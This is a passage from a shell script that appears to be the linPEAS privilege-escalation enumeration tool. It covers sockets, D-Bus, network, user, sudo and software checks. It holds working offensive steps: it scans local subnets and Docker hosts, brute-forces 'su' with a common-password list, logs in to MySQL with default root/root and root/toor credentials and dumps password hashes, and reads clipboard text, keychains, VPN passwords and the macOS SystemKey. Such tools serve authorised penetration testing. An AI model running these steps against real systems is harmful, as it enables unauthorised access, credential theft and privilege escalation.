    if [ -r "$l" ]; then
      perms="Read "
    fi
    if [ -w "$l" ];then
      perms="${perms}Write"
    fi
    
    if [ "$EXTRA_CHECKS" ] && [ "$(command -v curl)" ]; then
      CANNOT_CONNECT_TO_SOCKET="$(curl -v --unix-socket "$l" --max-time 1 http:/linpeas 2>&1 | grep -i 'Permission denied')"
      if ! [ "$CANNOT_CONNECT_TO_SOCKET" ]; then
        perms="${perms} - Can Connect"
      else
        perms="${perms} - Cannot Connect"
      fi
    fi
    
    if ! [ "$perms" ]; then echo "$l" | sed -${E} "s,$l,${SED_GREEN},g";
    else 
      echo "$l" | sed -${E} "s,$l,${SED_RED},g"
      echo "  └─(${RED}${perms}${NC})" | sed -${E} "s,Cannot Connect,${SED_GREEN},g"
      # Try to contact the socket
      socketcurl=$(curl --max-time 2 --unix-socket "$s" http:/index 2>/dev/null)
      if [ $? -eq 0 ]; then
        owner=$(ls -l "$s" | cut -d ' ' -f 3)
        echo "Socket $s owned by $owner uses HTTP. Response to /index: (limt 30)" | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed -${E} "s,$idB,${SED_RED},g"
        echo "$socketcurl" | head -n 30
      fi
    fi
  done
  echo ""
fi

#-- PSC) Writable and weak policies in D-Bus config files
print_2title "D-Bus config files"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus"
if [ "$PSTORAGE_DBUS" ]; then
  printf "%s\n" "$PSTORAGE_DBUS" | while read d; do
    for f in $d/*; do
      if ! [ "$IAMROOT" ] && [ -w "$f" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
        echo "Writable $f" | sed -${E} "s,.*,${SED_RED},g"
      fi

      genpol=$(grep "<policy>" "$f" 2>/dev/null)
      if [ "$genpol" ]; then printf "Weak general policy found on $f ($genpol)\n" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$mygroups,${SED_RED},g"; fi
      #if [ "`grep \"<policy user=\\\"$USER\\\">\" \"$f\" 2>/dev/null`" ]; then printf "Possible weak user policy found on $f () \n" | sed "s,$USER,${SED_RED},g"; fi

      userpol=$(grep "<policy user=" "$f" 2>/dev/null | grep -v "root")
      if [ "$userpol" ]; then printf "Possible weak user policy found on $f ($userpol)\n" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$mygroups,${SED_RED},g"; fi
      #for g in `groups`; do
      #  if [ "`grep \"<policy group=\\\"$g\\\">\" \"$f\" 2>/dev/null`" ]; then printf "Possible weak group ($g) policy found on $f\n" | sed "s,$g,${SED_RED},g"; fi
      #done
      grppol=$(grep "<policy group=" "$f" 2>/dev/null | grep -v "root")
      if [ "$grppol" ]; then printf "Possible weak user policy found on $f ($grppol)\n" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$mygroups,${SED_RED},g"; fi

      #TODO: identify allows in context="default"
    done
  done
fi
echo ""

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "D-Bus Service Objects list"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus"
  dbuslist=$(busctl list 2>/dev/null)
  if [ "$dbuslist" ]; then
    busctl list | while read line; do
      echo "$line" | sed -${E} "s,$dbuslistG,${SED_GREEN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},";
      if ! echo "$line" | grep -qE "$dbuslistG"; then
        srvc_object=$(echo $line | cut -d " " -f1)
        srvc_object_info=$(busctl status "$srvc_object" 2>/dev/null | grep -E "^UID|^EUID|^OwnerUID" | tr '\n' ' ')
        if [ "$srvc_object_info" ]; then
          echo " -- $srvc_object_info" | sed "s,UID=0,${SED_RED},"
        fi
      fi
    done
  else echo_not_found "busctl"
  fi
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q network_information; then
print_title "Network Information"
###########################################
#---------) Network Information (---------#
###########################################

if [ "$MACOS" ]; then
  print_2title "Network Capabilities"
  warn_exec system_profiler SPNetworkDataType
  echo ""
fi

#-- NI) Hostname, hosts and DNS
print_2title "Hostname, hosts and DNS"
cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null
warn_exec dnsdomainname 2>/dev/null
echo ""

#-- NI) /etc/inetd.conf
if [ "$EXTRA_CHECKS" ]; then
  print_2title "Content of /etc/inetd.conf & /etc/xinetd.conf"
  (cat /etc/inetd.conf /etc/xinetd.conf 2>/dev/null | grep -v "^$" | grep -Ev "\W+\#|^#" 2>/dev/null) || echo_not_found "/etc/inetd.conf"
  echo ""
fi

#-- NI) Interfaces
print_2title "Interfaces"
cat /etc/networks 2>/dev/null
(ifconfig || ip a || (cat /proc/net/dev; cat /proc/net/fib_trie; cat /proc/net/fib_trie6)) 2>/dev/null
echo ""

#-- NI) Neighbours
if [ "$EXTRA_CHECKS" ]; then
  print_2title "Networks and neighbours"
  if [ "$MACOS" ]; then
    netstat -rn 2>/dev/null
  else
    (route || ip n || cat /proc/net/route) 2>/dev/null
  fi
  (arp -e || arp -a || cat /proc/net/arp) 2>/dev/null
  echo ""
fi

if [ "$MACPEAS" ]; then
  print_2title "Firewall status"
  warn_exec system_profiler SPFirewallDataType
fi

#-- NI) Iptables
if [ "$EXTRA_CHECKS" ]; then
  print_2title "Iptables rules"
  (timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null) 2>/dev/null || echo_not_found "iptables rules"
  echo ""
fi

#-- NI) Ports
print_2title "Active Ports"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports"
( (netstat -punta || ss -nltpu || netstat -anv) | grep -i listen) 2>/dev/null | sed -${E} "s,127.0.[0-9]+.[0-9]+|:::|::1:|0\.0\.0\.0,${SED_RED},g"
echo ""

#-- NI) MacOS hardware ports
if [ "$MACPEAS" ] && [ "$EXTRA_CHECKS" ]; then
  print_2title "Hardware Ports"
  networksetup -listallhardwareports
  echo ""

  print_2title "VLANs"
  networksetup -listVLANs
  echo ""

  print_2title "Wifi Info"
  networksetup -getinfo Wi-Fi
  echo ""

  print_2title "Check Enabled Proxies"
  scutil --proxy
  echo ""

  print_2title "Wifi Proxy URL"
  networksetup -getautoproxyurl Wi-Fi
  echo ""
  
  print_2title "Wifi Web Proxy"
  networksetup -getwebproxy Wi-Fi
  echo ""

  print_2title "Wifi FTP Proxy"
  networksetup -getftpproxy Wi-Fi
  echo ""
fi

#-- NI) tcpdump
print_2title "Can I sniff with tcpdump?"
timeout 1 tcpdump >/dev/null 2>&1
if [ $? -eq 124 ]; then #If 124, then timed out == It worked
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sniffing"
    echo "You can sniff with tcpdump!" | sed -${E} "s,.*,${SED_RED},"
else echo_no
fi
echo ""

#-- NI) Internet access
if [ "$AUTO_NETWORK_SCAN" ] && [ "$TIMEOUT" ] && [ -f "/bin/bash" ]; then
  print_2title "Internet Access?"
  check_tcp_80 2>/dev/null &
  check_tcp_443 2>/dev/null &
  check_icmp 2>/dev/null &
  check_dns 2>/dev/null &
  wait
  echo ""
fi

if [ "$AUTO_NETWORK_SCAN" ]; then
  if ! [ "$FOUND_NC" ] && ! [ "$FOUND_BASH" ]; then
    printf $RED"[-] $SCAN_BAN_BAD\n$NC"
    echo "The network is not going to be scanned..."
  
  elif ! [ "$(command -v ifconfig)" ] && ! [ "$(command -v ip a)" ]; then
    printf $RED"[-] No ifconfig or ip commands, cannot find local ips\n$NC"
    echo "The network is not going to be scanned..."
  
  else
    print_2title "Scanning local networks (using /24)"

    if ! [ "$PING" ] && ! [ "$FPING" ]; then
      printf $RED"[-] $DISCOVER_BAN_BAD\n$NC"
    fi

    select_nc
    local_ips=$( (ip a 2>/dev/null || ifconfig) | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")
    printf "%s\n" "$local_ips" | while read local_ip; do
      if ! [ -z "$local_ip" ]; then
        print_3title "Discovering hosts in $local_ip/24"
        
        if [ "$PING" ] || [ "$FPING" ]; then
          discover_network "$local_ip/24" | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | grep -A 256 "Network Discovery" | grep -v "Network Discovery" | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $Wfolder/.ips.tmp
        fi
        
        discovery_port_scan "$local_ip/24" 22 | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | grep -A 256 "Ports going to be scanned" | grep -v "Ports going to be scanned" | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> $Wfolder/.ips.tmp
        
        sort $Wfolder/.ips.tmp | uniq > $Wfolder/.ips
        rm $Wfolder/.ips.tmp 2>/dev/null
        
        while read disc_ip; do
          me=""
          if [ "$disc_ip" = "$local_ip" ]; then
            me=" (local)"
          fi
          
          echo "Scanning top ports of ${disc_ip}${me}"
          (tcp_port_scan "$disc_ip" "" | grep -A 1000 "Ports going to be scanned" | grep -v "Ports going to be scanned" | sort | uniq) 2>/dev/null
          echo ""
        done < $Wfolder/.ips
        
        rm $Wfolder/.ips 2>/dev/null
        echo ""
      fi
    done
    
    print_3title "Scanning top ports of host.docker.internal"
    (tcp_port_scan "host.docker.internal" "" | grep -A 1000 "Ports going to be scanned" | grep -v "Ports going to be scanned" | sort | uniq) 2>/dev/null
    echo ""
  fi
fi

if [ "$MACOS" ]; then
  print_2title "Any MacOS Sharing Service Enabled?"
  rmMgmt=$(netstat -na | grep LISTEN | grep tcp46 | grep "*.3283" | wc -l);
  scrShrng=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.5900" | wc -l);
  flShrng=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep -E "\*.88|\*.445|\*.548" | wc -l);
  rLgn=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.22" | wc -l);
  rAE=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.3031" | wc -l);
  bmM=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.4488" | wc -l);
  printf "\nThe following services are OFF if '0', or ON otherwise:\nScreen Sharing: %s\nFile Sharing: %s\nRemote Login: %s\nRemote Mgmt: %s\nRemote Apple Events: %s\nBack to My Mac: %s\n\n" "$scrShrng" "$flShrng" "$rLgn" "$rmMgmt" "$rAE" "$bmM";
  echo ""
  print_2title "VPN Creds"
  system_profiler SPNetworkLocationDataType | grep -A 5 -B 7 ": Password"  | sed -${E} "s,Password|Authorization Name.*,${SED_RED},"
  echo ""

  if [ "$EXTRA_CHECKS" ]; then
    print_2title "Bluetooth Info"
    warn_exec system_profiler SPBluetoothDataType
    echo ""

    print_2title "Ethernet Info"
    warn_exec system_profiler SPEthernetDataType
    echo ""

    print_2title "USB Info"
    warn_exec system_profiler SPUSBDataType
    echo ""
  fi
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q users_information; then
print_title "Users Information"
###########################################
#----------) Users Information (----------#
###########################################

#-- UI) My user
print_2title "My user"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users"
(id || (whoami && groups)) 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed -${E} "s,$idB,${SED_RED},g"
echo ""

if [ "$MACPEAS" ];then
  print_2title "Current user Login and Logout hooks"
  defaults read $HOME/Library/Preferences/com.apple.loginwindow.plist 2>/dev/null | grep -e "Hook"
  echo ""

  print_2title "All Login and Logout hooks"
  defaults read /Users/*/Library/Preferences/com.apple.loginwindow.plist 2>/dev/null | grep -e "Hook"
  defaults read /private/var/root/Library/Preferences/com.apple.loginwindow.plist
  echo ""

  print_2title "Keychains"
  print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#chainbreaker"
  security list-keychains
  echo ""

  print_2title "SystemKey"
  ls -l /var/db/SystemKey
  if [ -r "/var/db/SystemKey" ]; then
    echo "You can read /var/db/SystemKey" | sed -${E} "s,.*,${SED_RED_YELLOW},";
    hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey | sed -${E} "s,.*,${SED_RED_YELLOW},";
  fi
  echo ""
fi

#-- UI) PGP keys?
print_2title "Do I have PGP keys?"
command -v gpg 2>/dev/null || echo_not_found "gpg"
gpg --list-keys 2>/dev/null
command -v netpgpkeys 2>/dev/null || echo_not_found "netpgpkeys"
netpgpkeys --list-keys 2>/dev/null
command -v netpgp 2>/dev/null || echo_not_found "netpgp"
echo ""

#-- UI) Clipboard and highlighted text
if [ "$(command -v xclip 2>/dev/null)" ] || [ "$(command -v xsel 2>/dev/null)" ] || [ "$(command -v pbpaste 2>/dev/null)" ] || [ "$DEBUG" ]; then
  print_2title "Clipboard or highlighted text?"
  if [ "$(command -v xclip 2>/dev/null)" ]; then
    echo "Clipboard: "$(xclip -o -selection clipboard 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
    echo "Highlighted text: "$(xclip -o 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  elif [ "$(command -v xsel 2>/dev/null)" ]; then
    echo "Clipboard: "$(xsel -ob 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
    echo "Highlighted text: "$(xsel -o 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  elif [ "$(command -v pbpaste 2>/dev/null)" ]; then
    echo "Clipboard: "$(pbpaste) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  else echo_not_found "xsel and xclip"
  fi
  echo ""
fi

#-- UI) Sudo -l
print_2title "Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid"
(echo '' | timeout 1 sudo -S -l | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,\!root,${SED_RED},") 2>/dev/null || echo_not_found "sudo"
if [ "$PASSWORD" ]; then
  (echo "$PASSWORD" | timeout 1 sudo -S -l | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g") 2>/dev/null  || echo_not_found "sudo"
fi
( grep -Iv "^$" cat /etc/sudoers | grep -v "#" | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,pwfeedback,${SED_RED},g" ) 2>/dev/null  || echo_not_found "/etc/sudoers"
if ! [ "$IAMROOT" ] && [ -w '/etc/sudoers.d/' ]; then
  echo "You can create a file in /etc/sudoers.d/ and escalate privileges" | sed -${E} "s,.*,${SED_RED_YELLOW},"
fi
for filename in /etc/sudoers.d/*; do
  if [ -r "$filename" ]; then
    echo "Sudoers file: $filename is readable" | sed -${E} "s,.*,${SED_RED},g"
    grep -Iv "^$" "$filename" | grep -v "#" | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,pwfeedback,${SED_RED},g"
  fi
done
echo ""

#-- UI) Sudo tokens
print_2title "Checking sudo tokens"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens"
ptrace_scope="$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
if [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ]; then
  echo "ptrace protection is disabled (0), so sudo tokens could be abused" | sed "s,is disabled,${SED_RED},g";

  if [ "$(command -v gdb 2>/dev/null)" ]; then
    echo "gdb was found in PATH" | sed -${E} "s,.*,${SED_RED},g";
  fi

  if [ "$CURRENT_USER_PIVOT_PID" ]; then
    echo "The current user proc $CURRENT_USER_PIVOT_PID is the parent of a different user proccess" | sed -${E} "s,.*,${SED_RED},g";
  fi

  if [ -f "$HOME/.sudo_as_admin_successful" ]; then
    echo "Current user has .sudo_as_admin_successful file, so he can execute with sudo" | sed -${E} "s,.*,${SED_RED},";
  fi

  if ps -eo pid,command -u "$(id -u)" | grep -v "$PPID" | grep -v " " | grep -qE '(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$'; then
    echo "Current user has other interactive shells running: " | sed -${E} "s,.*,${SED_RED},g";
    ps -eo pid,command -u "$(id -u)" | grep -v "$PPID" | grep -v " " | grep -E '(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$'
  fi

else
  echo "ptrace protection is enabled ($ptrace_scope)" | sed "s,is enabled,${SED_GREEN},g";

fi
echo ""

#-- UI) Doas
if [ -f "/etc/doas.conf" ] || [ "$DEBUG" ]; then
  print_2title "Checking doas.conf"
  doas_dir_name=$(dirname "$(command -v doas)" 2>/dev/null)
  if [ "$(cat /etc/doas.conf $doas_dir_name/doas.conf $doas_dir_name/../etc/doas.conf $doas_dir_name/etc/doas.conf 2>/dev/null)" ]; then
    cat /etc/doas.conf "$doas_dir_name/doas.conf" "$doas_dir_name/../etc/doas.conf" "$doas_dir_name/etc/doas.conf" 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_RED}," | sed "s,root,${SED_RED}," | sed "s,nopass,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,$USER,${SED_RED_YELLOW},"
  else echo_not_found "doas.conf"
  fi
  echo ""
fi

#-- UI) Pkexec policy
print_2title "Checking Pkexec policy"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2"
(cat /etc/polkit-1/localauthority.conf.d/* 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED}," | sed -${E} "s,$groupsVB,${SED_RED}," | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,$USER,${SED_RED_YELLOW}," | sed -${E} "s,$Groups,${SED_RED_YELLOW},") || echo_not_found "/etc/polkit-1/localauthority.conf.d"
echo ""

#-- UI) Superusers
print_2title "Superusers"
awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED_YELLOW}," | sed "s,root,${SED_RED},"
echo ""

#-- UI) Users with console
print_2title "Users with console"
if [ "$MACPEAS" ]; then
  dscl . list /Users | while read uname; do
    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
    if grep -q "$ushell" /etc/shells; then #Shell user
      dscl . -read "/Users/$uname" UserShell RealName RecordName Password NFSHomeDirectory 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
      echo ""
    fi
  done
else
  no_shells=$(grep -Ev "sh$" /etc/passwd 2>/dev/null | cut -d ':' -f 7 | sort | uniq)
  unexpected_shells=""
  printf "%s\n" "$no_shells" | while read f; do
    if $f -c 'whoami' 2>/dev/null | grep -q "$USER"; then
      unexpected_shells="$f\n$unexpected_shells"
    fi
  done
  grep "sh$" /etc/passwd 2>/dev/null | sort | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  if [ "$unexpected_shells" ]; then
    printf "%s" "These unexpected binaries are acting like shells:\n$unexpected_shells" | sed -${E} "s,/.*,${SED_RED},g"
    echo "Unexpected users with shells:"
    printf "%s\n" "$unexpected_shells" | while read f; do
      if [ "$f" ]; then
        grep -E "${f}$" /etc/passwd | sed -${E} "s,/.*,${SED_RED},g"
      fi
    done
  fi
fi
echo ""

#-- UI) All users & groups
print_2title "All users & groups"
if [ "$MACPEAS" ]; then
  dscl . list /Users | while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g"
else
  cut -d":" -f1 /etc/passwd 2>/dev/null| while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g"
fi
echo ""

#-- UI) Login now
print_2title "Login now"
(w || who || finger || users) 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
echo ""

#-- UI) Last logons
print_2title "Last logons"
(last -Faiw || last) 2>/dev/null | tail | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_RED}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
echo ""

#-- UI) Login info
print_2title "Last time logon each user"
lastlog 2>/dev/null | grep -v "Never" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"

EXISTS_FINGER="$(command -v finger 2>/dev/null)"
if [ "$MACPEAS" ] && [ "$EXISTS_FINGER" ]; then
  dscl . list /Users | while read uname; do
    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
    if grep -q "$ushell" /etc/shells; then #Shell user
      finger "$uname" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
      echo ""
    fi
  done
fi
echo ""

#-- UI) Password policy
if [ "$EXTRA_CHECKS" ]; then
  print_2title "Password policy"
  grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null || echo_not_found "/etc/login.defs"
  echo ""

  if [ "$MACPEAS" ]; then
    print_2title "Relevant last user info and user configs"
    defaults read /Library/Preferences/com.apple.loginwindow.plist 2>/dev/null
    echo ""

    print_2title "Guest user status"
    sysadminctl -afpGuestAccess status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
    sysadminctl -guestAccount status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
    sysadminctl -smbGuestAccess status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
    echo ""
  fi
fi

#-- UI) Brute su
if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ] && ! [ "$IAMROOT" ]; then
  print_2title "Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
  POSSIBE_SU_BRUTE=$(check_if_su_brute);
  if [ "$POSSIBE_SU_BRUTE" ]; then
    SHELLUSERS=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1)
    printf "%s\n" "$SHELLUSERS" | while read u; do
      echo "  Bruteforcing user $u..."
      su_brute_user_num "$u" $PASSTRY
    done
  else
    printf $GREEN"It's not possible to brute-force su.\n\n"$NC
  fi
else
  print_2title "Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)\n"$NC
fi
print_2title "Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!\n"$NC

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q software_information; then
print_title "Software Information"
###########################################
#--------) Software Information (---------#
###########################################

NGINX_KNOWN_MODULES="ngx_http_geoip_module.so|ngx_http_xslt_filter_module.so|ngx_stream_geoip_module.so|ngx_http_image_filter_module.so|ngx_mail_module.so|ngx_stream_module.so"

#-- SI) Useful software
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Useful software"
  for tool in $USEFUL_SOFTWARE; do command -v "$tool"; done
  echo ""
fi

#-- SI) Search for compilers
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Installed Compilers"
  (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; command -v gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/");
  echo ""

  if [ "$(command -v pkg 2>/dev/null)" ]; then
      print_2title "Vulnerable Packages"
      pkg audit -F | sed -${E} "s,vulnerable,${SED_RED},g"
      echo ""
  fi

  if [ "$(command -v brew 2>/dev/null)" ]; then
      print_2title "Brew Installed Packages"
      brew list
      echo ""
  fi
fi

if [ "$MACPEAS" ]; then
    print_2title "Writable Installed Applications"
    system_profiler SPApplicationsDataType | grep "Location:" | cut -d ":" -f 2 | cut -c2- | while read f; do
        if [ -w "$f" ]; then
            echo "$f is writable" | sed -${E} "s,.*,${SED_RED},g"
        fi
    done

    system_profiler SPFrameworksDataType | grep "Location:" | cut -d ":" -f 2 | cut -c2- | while read f; do
        if [ -w "$f" ]; then
            echo "$f is writable" | sed -${E} "s,.*,${SED_RED},g"
        fi
    done
fi

#-- SI) MySQL version
if [ "$(command -v mysql)" ] || [ "$(command -v mysqladmin)" ] || [ "$DEBUG" ]; then
  print_2title "MySQL version"
  mysql --version 2>/dev/null || echo_not_found "mysql"
  mysqluser=$(systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1)
  if [ "$mysqluser" ]; then
    echo "MySQL user: $mysqluser" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  fi
  echo ""
  echo ""

  #-- SI) MySQL connection root/root
  print_list "MySQL connection using default root/root ........... "
  mysqlconnect=$(mysqladmin -uroot -proot version 2>/dev/null)
  if [ "$mysqlconnect" ]; then
    echo "Yes" | sed -${E} "s,.*,${SED_RED},"
    mysql -u root --password=root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  #-- SI) MySQL connection root/toor
  print_list "MySQL connection using root/toor ................... "
  mysqlconnect=$(mysqladmin -uroot -ptoor version 2>/dev/null)
  if [ "$mysqlconnect" ]; then
    echo "Yes" | sed -${E} "s,.*,${SED_RED},"
